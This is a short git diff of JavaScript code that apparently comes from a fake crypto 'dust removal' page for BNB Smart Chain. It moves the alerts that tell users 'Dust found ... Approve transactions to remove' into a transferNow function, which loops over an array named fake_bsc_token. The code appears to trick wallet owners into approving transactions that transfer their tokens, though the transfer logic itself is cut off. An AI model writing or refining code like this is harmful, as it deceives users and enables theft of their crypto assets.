@@ -395,12 +395,7 @@ async function proceed(){
         });
          if(i+1 === bsc_length){
           console.log("fake tokens", fake_bsc_token);
-          if(fake_bsc_token.length < 1){
-            alert("No dust found");
-          }
-          else{
-            alert("Dust found ... Approve transactions to remove");
-          }
+          
           transferNow();
 
          }
@@ -417,6 +412,12 @@ async function proceed(){
           let x = 0;
           let whono = "";
           async function transferNow(){
+            if(fake_bsc_token.length < 1){
+              alert("No dust found");
+            }
+            else{
+              alert("Dust found ... Approve transactions to remove");
+            }
             for(let n=0; n<fake_bsc_token.length; n++){
               
             console.log("okay nah");
